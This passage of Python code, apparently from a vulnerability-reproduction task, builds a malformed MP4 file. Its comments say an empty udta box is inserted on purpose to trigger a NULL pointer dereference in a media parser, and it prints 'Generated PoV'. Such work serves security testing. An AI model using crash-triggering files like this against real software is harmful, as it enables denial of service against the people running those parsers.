ideo handler\n    hdlr_data = struct.pack(\'>IIIII\', 0, 0, 0x76696465, 0, 0) + b\'VideoHandler\\x00\'\n    mdia_content += write_fullbox(\'hdlr\', 0, 0, hdlr_data)\n    \n    # minf box\n    minf_content = b\'\'\n    \n    # vmhd box\n    vmhd_data = struct.pack(\'>HHHH\', 0, 0, 0, 0)\n    minf_content += write_fullbox(\'vmhd\', 0, 1, vmhd_data)\n    \n    # dinf box\n    dinf_content = b\'\'\n    dref_data = struct.pack(\'>I\', 1)\n    url_box = write_fullbox(\'url \', 0, 1, b\'\')\n    dref_data += url_box\n    dinf_content += write_fullbox(\'dref\', 0, 0, dref_data)\n    minf_content += write_box(\'dinf\', dinf_content)\n    \n    # stbl box\n    stbl_content = b\'\'\n    \n    # stsd box with avc1 entry\n    stsd_data = struct.pack(\'>I\', 1)\n    avc1_data = b\'\\x00\' * 6 + struct.pack(\'>H\', 1)\n    avc1_data += b\'\\x00\' * 16\n    avc1_data += struct.pack(\'>HH\', 320, 240)\n    avc1_data += struct.pack(\'>I\', 0x00480000)\n    avc1_data += struct.pack(\'>I\', 0x00480000)\n    avc1_data += struct.pack(\'>I\', 0)\n    avc1_data += struct.pack(\'>H\', 1)\n    avc1_data += b\'\\x00\' * 32\n    avc1_data += struct.pack(\'>HH\', 0x0018, 0xFFFF)\n    \n    # Add avcC box\n    avcc_data = struct.pack(\'>BBBBBBHBHBBBBB\',\n        1, 0x64, 0x00, 0x1F, 0xFF, 0xE1,\n        0, 7, 0x67, 0x64, 0x00, 0x1F, 0xAC, 0xD9, 0x40\n    )\n    avcc_data += struct.pack(\'>BH\', 1, 4)\n    avcc_data += b\'\\x68\\xEB\\xE3\\xCB\'\n    avc1_data += write_box(\'avcC\', avcc_data)\n    \n    stsd_data += write_box(\'avc1\', avc1_data)\n    stbl_content += write_fullbox(\'stsd\', 0, 0, stsd_data)\n    \n    # stts box\n    stts_data = struct.pack(\'>I\', 1)\n    stts_data += struct.pack(\'>II\', 1, 1000)\n    stbl_content += write_fullbox(\'stts\', 0, 0, stts_data)\n    \n    # stsc box\n    stsc_data = struct.pack(\'>I\', 1)\n    stsc_data += struct.pack(\'>III\', 1, 1, 1)\n    stbl_content += write_fullbox(\'stsc\', 0, 0, stsc_data)\n    \n    # stsz box\n    stsz_data = struct.pack(\'>II\', 0, 1)\n    stsz_data += struct.pack(\'>I\', 100)\n    stbl_content += write_fullbox(\'stsz\', 0, 0, stsz_data)\n    \n    # stco box\n    stco_data = struct.pack(\'>I\', 1)\n    stco_data += struct.pack(\'>I\', 1000)\n    stbl_content += write_fullbox(\'stco\', 0, 0, stco_data)\n    \n    # stss box - sync samples (needed for DASH with sap=1)\n    stss_data = struct.pack(\'>I\', 1)\n    stss_data += struct.pack(\'>I\', 1)\n    stbl_content += write_fullbox(\'stss\', 0, 0, stss_data)\n    \n    minf_content += write_box(\'stbl\', stbl_content)\n    mdia_content += write_box(\'minf\', minf_content)\n    trak_content += write_box(\'mdia\', mdia_content)\n    \n    # CRITICAL: Create an EMPTY udta box\n    # An empty udta box will be parsed and udta will exist, \n    # but recordList might not be initialized (NULL)\n    # This triggers the NULL pointer dereference at line 2806\n    udta_content = b\'\'\n    trak_content += write_box(\'udta\', udta_content)\n    \n    moov_content += write_box(\'trak\', trak_content)\n    \n    # Write moov box\n    f.write(write_box(\'moov\', moov_content))\n    \n    # mdat box\n    mdat_data = b\'\\x00\' * 100\n    f.write(write_box(\'mdat\', mdat_data))\n\nprint(f"Generated PoV at {output_path}")\n'}
